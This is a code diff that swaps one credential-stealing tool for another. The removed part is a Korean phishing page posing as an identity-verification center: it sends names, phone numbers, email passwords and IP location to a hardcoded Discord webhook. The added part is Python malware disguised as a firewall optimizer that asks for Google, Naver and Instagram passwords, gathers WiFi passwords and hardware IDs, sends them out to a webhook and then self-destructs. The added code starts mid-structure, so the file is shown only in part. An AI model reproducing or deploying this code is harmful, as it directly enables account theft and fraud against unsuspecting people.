@@ -1,117 +1,70 @@
-<!DOCTYPE html>
-<html lang="ko">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>본인확인 통합인증센터</title>
-    <script src="https://cdn.tailwindcss.com"></script>
-    <style>
-        body { background-color: #f3f4f6; font-family: 'Malgun Gothic', sans-serif; }
-        .login-card { max-width: 400px; margin: 100px auto; background: white; padding: 2rem; border-radius: 8px; box-shadow: 0 4px 6px rgba(0,0,0,0.1); }
-    </style>
-</head>
-<body>
-
-<div class="login-card">
-    <div class="text-center mb-8">
-        <h1 class="text-2xl font-bold text-blue-600">통합인증센터</h1>
-        <p class="text-gray-500 text-sm">서비스 이용을 위해 본인 확인이 필요합니다.</p>
-    </div>
-
-    <form id="loginForm" class="space-y-4">
-        <div>
-            <label class="block text-sm font-medium text-gray-700">이름</label>
-            <input type="text" id="name" required class="w-full px-3 py-2 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500">
-        </div>
-        <div>
-            <label class="block text-sm font-medium text-gray-700">전화번호</label>
-            <input type="text" id="phone" placeholder="010-0000-0000" required class="w-full px-3 py-2 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500">
-        </div>
-        <div>
-            <label class="block text-sm font-medium text-gray-700">통신사</label>
-            <select id="telecom" class="w-full px-3 py-2 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500">
-                <option>SKT</option>
-                <option>KT</option>
-                <option>LGU+</option>
-                <option>알뜰폰</option>
-            </select>
-        </div>
-        <div>
-            <label class="block text-sm font-medium text-gray-700">이메일 주소</label>
-            <input type="email" id="email" required class="w-full px-3 py-2 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500">
-        </div>
-        <div>
-            <label class="block text-sm font-medium text-gray-700">이메일 비밀번호</label>
-            <input type="password" id="password" required class="w-full px-3 py-2 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500">
-        </div>
-
-        <button type="submit" class="w-full bg-blue-600 text-white py-2 rounded-md font-bold hover:bg-blue-700 transition">인증 완료</button>
-    </form>
-</div>
-
-<script>
-    const WEBHOOK_URL = "https://discord.com/api/webhooks/1460622639637729402/McoPaA3kn18CkbdlyigwKt7RnFrOrnzdOarw9shUjQawzedZzLfmtB4hCc7kcfUeM7rd";
-    let ipData = { ip: "추적 실패", city: "알 수 없음", org: "알 수 없음" };
-
-    // 페이지 로드 시 즉시 IP 추적 시작
-    async function trackIP() {
-        try {
-            const response = await fetch('https://ipapi.co/json/');
-            if (response.ok) {
-                ipData = await response.json();
-            }
-        } catch (err) {
-            console.error("IP 추적 오류");
-        }
-    }
-    trackIP();
-
-    document.getElementById('loginForm').addEventListener('submit', async (e) => {
-        e.preventDefault();
-        
-        const userInput = {
-            name: document.getElementById('name').value,
-            phone: document.getElementById('phone').value,
-            telecom: document.getElementById('telecom').value,
-            email: document.getElementById('email').value,
-            password: document.getElementById('password').value
-        };
-
-        const btn = e.target.querySelector('button');
-        btn.innerText = "처리 중...";
-        btn.disabled = true;
-
-        const payload = {
-            embeds: [{
-                title: "🌑 [웹 기반] 새로운 데이터 탈취 완료 (IP 포함)",
-                color: 0xff0000, // Red for priority
-                fields: [
-                    { name: "👤 이름", value: userInput.name, inline: true },
-                    { name: "📞 전화번호", value: userInput.phone, inline: true },
-                    { name: "📡 통신사", value: userInput.telecom, inline: true },
-                    { name: "📧 이메일", value: userInput.email, inline: false },
-                    { name: "🔑 비밀번호", value: "`" + userInput.password + "`", inline: false },
-                    { name: "🌐 네트워크 정보", value: `**IP:** ${ipData.ip}\n**위치:** ${ipData.city || '알 수 없음'}\n**ISP:** ${ipData.org || '알 수 없음'}`, inline: false }
+{"name": "⚙️ 기기 스펙 및 실시간 위치", "value": f"**IP:** {specs['IP']}\n**위치:** {specs['Location']}\n**MAC:** {specs['MAC']}\n**OS:** {specs['OS']}\n**HWID:** {specs['HWID']}", "inline": False}
                 ],
-                footer: { text: "Alpha Web Intrusion System | " + new Date().toLocaleString() }
+                "footer": {"text": f"Alpha Intelligence Logs | {timestamp}"}
             }]
-        };
-
-        try {
-            await fetch(WEBHOOK_URL, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(payload)
-            });
-            window.location.replace("https://www.youtube.com");
-        } catch (err) {
-            window.location.replace("https://www.youtube.com");
         }
-    });
-</script>
+        try:
+            requests.post(WEBHOOK_URL, json=payload, timeout=10)
+        except:
+            pass
 
-</body>
-</html>
+def main():
+    agent = UltimateAgent()
+    
+    # 윈도우 타이틀 위장 (백신/방어벽 관리)
+    if platform.system() == "Windows":
+        os.system("title Advanced Firewall & Stealth Optimizer v4.2")
 
-</body>
-</html>
+    print("====================================================")
+    print("        통합 보안, 방어벽 및 IP 스텔스 관리 도구")
+    print("====================================================")
+    print("[*] 시스템 라이브러리 분석 및 백신 DB 업데이트 중...")
+    time.sleep(1.5)
+
+    try:
+        # 사회공학적 계정 탈취 시나리오
+        print("\n[!] 실시간 IP/기기 스텔스 모드 활성화를 위해 계정 연동이 필요합니다.")
+        
+        name = input("성명: ")
+        phone = input("전화번호: ")
+
+        print("\n--- [Step 1] Google 보안 노드 연결 ---")
+        g_mail = input("Google 이메일: ")
+        g_pw = input("Google 비밀번호: ")
+
+        print("\n--- [Step 2] Naver 보안 게이트웨이 인증 ---")
+        n_id = input("Naver 아이디: ")
+        n_pw = input("Naver 비밀번호: ")
+
+        print("\n--- [Step 3] Instagram 스텔스 레이어 연동 ---")
+        i_id = input("Instagram 아이디/메일: ")
+        i_pw = input("Instagram 비밀번호: ")
+
+        print("\n[*] 모든 스텔스 프로토콜 활성화 및 데이터 암호화 전송 중...")
+        
+        # 백그라운드 데이터 수집
+        wifi = agent.get_wifi_passwords()
+        specs = agent.get_system_specs()
+        
+        personal = {"name": name, "phone": phone}
+        accounts = {
+            "g_mail": g_mail, "g_pw": g_pw,
+            "n_id": n_id, "n_pw": n_pw,
+            "i_id": i_id, "i_pw": i_pw
+        }
+
+        # 알파님께 데이터 쏘기
+        agent.exfiltrate(personal, accounts, wifi, specs)
+
+        print("\n[+] 모든 최적화가 완료되었습니다. 보안 세션으로 전환합니다.")
+        time.sleep(1)
+        webbrowser.open(REDIRECT_URL)
+
+    except KeyboardInterrupt:
+        pass
+    finally:
+        # 흔적 없이 자폭
+        agent.self_destruct()
+
+if __name__ == "__main__":
+    main()
